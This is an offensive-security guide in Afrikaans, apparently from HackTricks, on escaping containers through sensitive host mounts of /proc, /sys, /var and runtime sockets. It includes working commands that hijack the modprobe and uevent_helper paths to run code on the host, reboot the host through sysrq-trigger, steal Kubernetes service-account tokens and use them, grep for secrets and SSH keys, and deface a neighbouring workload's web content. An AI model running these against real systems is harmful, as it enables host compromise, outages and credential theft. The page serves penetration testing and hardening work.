# Gevoelige gasheer-monteerplekke

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Gasheer-monteerplekke is een van die belangrikste praktiese oppervlaktes vir container-ontsnapping omdat hulle dikwels 'n noukeurig geïsoleerde proses-uitsig terug laat inklap in direkte sigbaarheid van gasheerhulpbronne. Die gevaarlike gevalle beperk sig nie tot `/` nie. Bind mounts van `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, of device-related paths kan kernel-beheerkoppelinge, credentials, aangrensende container-lêerstelsels en runtime-bestuursinterfaces blootstel.

Hierdie blad bestaan afsonderlik van die individuele beskermingsbladsye omdat die misbruikmodel oor meerdere gebiede loop. 'n Skryfbare gasheer-monteerplek is gevaarlik deels as gevolg van mount namespaces, deels as gevolg van user namespaces, deels as gevolg van AppArmor of SELinux-beskerming, en deels as gevolg van watter presiese gasheerpad blootgestel is. Dit as 'n eie onderwerp behandel maak die aanvaloppervlak veel makliker om oor na te dink.

## `/proc` Blootstelling

procfs bevat beide gewone prosesinligting en hoë-impak kernel-beheerkoppelvlakke. 'n Bind mount soos `-v /proc:/host/proc` of 'n container-uitsig wat onversekte skryfbare proc-inskrywings openbaar kan dus lei tot inligtingsvrystelling, denial of service, of direkte uitvoering van kode op die gasheer.

Hoog-waarde procfs-paaie sluit in:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Misbruik

Begin deur na te gaan watter hoë-waarde procfs-inskrywings sigbaar of skryfbaar is:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Hierdie paths is interessant om verskillende redes. `core_pattern`, `modprobe`, en `binfmt_misc` kan hooffunksie host code-execution paths word wanneer hulle skryfbaar is. `kallsyms`, `kmsg`, `kcore`, en `config.gz` is kragtige reconnaissance-bronne vir kernel exploitation. `sched_debug` en `mountinfo` openbaar process, cgroup, en filesystem context wat kan help om die host layout van binne die container te rekonstrueer.

Die praktiese waarde van elke path is anders, en om almal asof hulle dieselfde impak het maak triage moeiliker:

- `/proc/sys/kernel/core_pattern`
Indien skryfbaar, is dit een van die hoogste-impak procfs paths omdat die kernel 'n pipe handler sal uitvoer na 'n crash. 'n container wat `core_pattern` kan wys na 'n payload gestoor in sy overlay of in 'n gemounte host path kan dikwels host code execution verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir 'n toegewyde voorbeeld.
- `/proc/sys/kernel/modprobe`
Hierdie path beheer die userspace helper wat deur die kernel gebruik word wanneer dit module-loading logika moet aanroep. Indien skryfbaar vanaf die container en geïnterpreteer in die host context, kan dit 'n ander host code-execution primitive word. Dit is veral interessant wanneer dit gekombineer word met 'n manier om die helper path te trigger.
- `/proc/sys/vm/panic_on_oom`
Dit is gewoonlik nie 'n netjiese escape primitive nie, maar dit kan memory pressure omskakel in host-wye denial of service deur OOM-toestande in kernel panic-gedrag te verander.
- `/proc/sys/fs/binfmt_misc`
As die registration interface skryfbaar is, kan die attacker 'n handler registreer vir 'n gekose magic value en host-context execution verkry wanneer 'n pasende lêer uitgevoer word.
- `/proc/config.gz`
Nuttig vir kernel exploit triage. Dit help bepaal watter subsisteme, mitigations, en opsionele kernel features geaktiveer is sonder om host package metadata te benodig.
- `/proc/sysrq-trigger`
Meestal 'n denial-of-service path, maar 'n baie ernstige een. Dit kan die host onmiddellik reboot, panic, of andersins ontwrig.
- `/proc/kmsg`
Onthul kernel ring buffer messages. Nuttig vir host fingerprinting, crash analysis, en in sommige omgewings vir leak information wat nuttig is vir kernel exploitation.
- `/proc/kallsyms`
Waardevol wanneer leesbaar omdat dit exported kernel symbol information blootstel en kan help om address randomization aannames te verslaan tydens kernel exploit ontwikkeling.
- `/proc/[pid]/mem`
Dit is 'n direkte process-memory interface. As die target process bereikbaar is met die nodige ptrace-style voorwaardes, kan dit toelaat om 'n ander proses se memory te lees of te wysig. Die realistiese impak hang swaar af van credentials, `hidepid`, Yama, en ptrace-restriksies, dus is dit 'n kragtige maar voorwaardelike path.
- `/proc/kcore`
Blootstel 'n core-image-style aansig van stelsel memory. Die lêer is reusagtig en ongemaklik om te gebruik, maar as dit betekenisvol leesbaar is, dui dit op 'n sleg blootgestelde host memory surface.
- `/proc/kmem` and `/proc/mem`
Histories hoë-impak raw memory interfaces. Op baie moderne stelsels is hulle gedeaktiveer of swaar beperk, maar as hulle teenwoordig en bruikbaar is, moet hulle as kritieke bevindinge behandel word.
- `/proc/sched_debug`
Leaks scheduling en task information wat host process identities kan blootstel selfs wanneer ander process views skoner lyk as verwag.
- `/proc/[pid]/mountinfo`
Uitermate nuttig om te reconstrueer waar die container werklik op die host woon, watter paths overlay-backed is, en of 'n skryfbare mount ooreenstem met host content of slegs met die container layer.

Indien `/proc/[pid]/mountinfo` of overlay details leesbaar is, gebruik hulle om die host path van die container filesystem te herstel:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Hierdie opdragte is nuttig omdat verskeie host-uitvoeringstrieke vereis dat 'n pad binne die kontenaar omskakel word na die ooreenstemmende pad vanuit die gasheer se oogpunt.

### Volledige Voorbeeld: `modprobe` Helper Path Abuse

Indien `/proc/sys/kernel/modprobe` skryfbaar is vanuit die kontenaar en die helper path in die gasheer-konteks geïnterpreteer word, kan dit herlei word na 'n attacker-controlled payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Die presiese trigger hang af van die teiken en kernel-gedrag, maar die belangrike punt is dat 'n writable helper path 'n toekomstige kernel helper invocation na attacker-controlled host-path content kan herlei.

### Volledige voorbeeld: Kernel Recon met `kallsyms`, `kmsg`, en `config.gz`

As die doel exploitability assessment eerder as onmiddellike escape is:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Hierdie opdragte help om te bepaal of nuttige simboolinligting sigbaar is, of onlangse kernel-boodskappe interessante toestand openbaar, en watter kernel-funksies of -mitigerings gekompileer is. Die impak is gewoonlik nie 'n direkte ontsnapping nie, maar dit kan die triëring van kernel-kwesbaarhede skerp verkort.

### Volledige Voorbeeld: SysRq Host Reboot

As `/proc/sysrq-trigger` skryfbaar is en die host-uitsig bereik:
```bash
echo b > /proc/sysrq-trigger
```
Die effek is onmiddellike herbegin van die gasheer. Dit is nie 'n subtiele voorbeeld nie, maar dit demonstreer duidelik dat procfs-blootstelling veel ernstiger kan wees as inligtingsvrystelling.

## `/sys` Blootstelling

sysfs openbaar 'n groot hoeveelheid kernel- en toestelstatus. Sommige sysfs-paadjies is hoofsaaklik nuttig vir fingerprinting, terwyl ander helper-uitvoering, toestelgedrag, security-module-konfigurasie of firmwaretoestand kan beïnvloed.

Hoë-waarde sysfs-paadjies sluit in:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paadjies is om verskillende redes belangrik. `/sys/class/thermal` kan termiese bestuursgedrag beïnvloed en dus die stabiliteit van die gasheer in swak blootgestelde omgewings. `/sys/kernel/vmcoreinfo` kan leak crash-dump- en kernel-layout-inligting wat help met laevlak-host fingerprinting. `/sys/kernel/security` is die `securityfs`-koppelvlak wat deur Linux Security Modules gebruik word, so onverwagte toegang daar kan MAC-verwante toestand blootlê of verander. EFI-variabelepaadjies kan firmware-ondersteunde opstartinstellings beïnvloed, wat dit baie ernstiger maak as gewone konfigurasielêers. `debugfs` onder `/sys/kernel/debug` is besonder gevaarlik omdat dit bedoel is as 'n ontwikkelaargerigte koppelvlak met baie minder veiligheidsverwagtinge as die verhardde kernel-API's wat op produksie gerig is.

Nuttige kommando's om hierdie paadjies te ondersoek is:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Wat hierdie opdragte interessant maak:

- `/sys/kernel/security` kan openbaar maak of AppArmor, SELinux, of 'n ander LSM-oppervlak sigbaar is op 'n manier wat host-only moes gebly het.
- `/sys/kernel/debug` is dikwels die mees beangstigende bevinding in hierdie groep. As debugfs gemonteer is en leesbaar of skryfbaar is, verwag 'n wye oppervlak wat na die kernel gerig is, waarvan die presiese risiko afhang van die geaktiveerde debug nodes.
- EFI-variabele blootstelling is minder algemeen, maar as dit teenwoordig is het dit 'n hoë impak omdat dit firmware-ondersteunde instellings raak eerder as gewone runtime-lêers.
- `/sys/class/thermal` is hoofsaaklik relevant vir host-stabiliteit en hardware-interaksie, nie vir netjiese shell-styl escape nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik 'n bron vir host-fingerprinting en crash-analysis, nuttig om laevlak kernel-toestand te verstaan.

### Volledige voorbeeld: `uevent_helper`

Indien `/sys/kernel/uevent_helper` skryfbaar is, kan die kernel 'n deur 'n aanvaller beheerde helper uitvoer wanneer 'n `uevent` geaktiveer word:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Die rede waarom dit werk, is dat die helper-pad vanuit die gasheer se oogpunt geïnterpreteer word. Sodra dit geaktiveer word, word die helper in die gasheerkonteks uitgevoer in plaas van binne die huidige container.

## `/var` Blootstelling

Om die gasheer se `/var` in 'n container te mount, word dikwels onderskat omdat dit nie so dramaties lyk soos om `/` te mount nie. In die praktyk kan dit genoeg wees om runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, en aangrensende application filesystems te bereik. Op moderne nodes is `/var` dikwels waar die mees operationeel interessante container state eintlik woon.

### Kubernetes Voorbeeld

'n pod met `hostPath: /var` kan dikwels ander pods se projected tokens en overlay snapshot content lees:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle beantwoord of die mount slegs onbelangrike toepassingsdata blootstel of hoë-impak kluster-inlogbewyse. 'n leesbare service-account-token kan plaaslike kode-uitvoering onmiddellik omskakel in Kubernetes API-toegang.

As die token teenwoordig is, valideer wat dit kan bereik in plaas daarvan om by token-ontdekking te stop:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die impak hier kan baie groter wees as plaaslike node-toegang alleen. 'n token met wye RBAC kan 'n gemonteerde `/var` in 'n kompromittering vir die hele cluster omskep.

### Docker en containerd Voorbeeld

Op Docker-hosts is die relevante data dikwels onder `/var/lib/docker`, terwyl op containerd-ondersteunde Kubernetes-nodes dit moontlik onder `/var/lib/containerd` of snapshotter-spesifieke paaie kan wees:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
As die gemonteerde `/var` skryfbare snapshot-inhoud van 'n ander workload blootstel, kan die attacker moontlik toepassingslêers wysig, webinhoud plant, of opstartskripte verander sonder om die huidige container-konfigurasie aan te raak.

Konkrete misbruikidees sodra skryfbare snapshot-inhoud gevind is:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Hierdie opdragte is nuttig omdat dit die drie hoof-impakfamilies van die gemounte `/var` wys: toepassingsmanipulasie, geheimsherwinning, en laterale beweging na aangrensende workloads.

## Runtime-sokette

Sensitiewe host-mounts sluit dikwels runtime-sokette in eerder as volledige gidse. Dit is so belangrik dat dit hier eksplisiet herhaal moet word:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige uitbuitingsvloeie sodra een van hierdie sockets gemonteer is.

As 'n vinnige eerste interaksiepatroon:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
As een hiervan slaag, is die pad van "mounted socket" na "start a more privileged sibling container" gewoonlik veel korter as enige kernel-breakout-pad.

## Mount-Related CVEs

Gasheer-mounts kruis ook met runtime-kwesbaarhede. Belangrike onlangse voorbeelde sluit in:

- `CVE-2024-21626` in `runc`, waar 'n leaked gids-lêerbeskrywer die werkmap op die gasheer-lêerstelsel kon plaas.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, waar OverlayFS copy-up races tydens builds skrywings op gasheerpade kon produseer.
- `CVE-2024-1753` in Buildah and Podman build flows, waar sorgvuldig saamgestelde bind mounts tydens 'n build `/` as read-write kon blootstel.
- `CVE-2024-40635` in containerd, waar 'n groot `User`-waarde kon oorloop na UID 0-gedrag.

Hierdie CVEs is hier van belang omdat hulle wys dat hantering van mounts nie slegs oor operatorkonfigurasie gaan nie. Die runtime self kan ook mount-gedrewe ontsnappingsvoorwaardes skep.

## Kontroles

Gebruik hierdie opdragte om vinnig die hoogste-waarde mount-blootstellings te lokaliseren:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root, `/proc`, `/sys`, `/var` en runtime sockets is alles bevindinge van hoë prioriteit.
- Skryfbare proc/sys-inskrywings beteken dikwels dat die mount gasheer-globale kernelkontroles blootstel eerder as 'n veilige container-uitsig.
- Gemounte `/var`-paaie verdien credential- en naburige-workload-hersiening, nie net 'n lêerstelsel-hersiening nie.
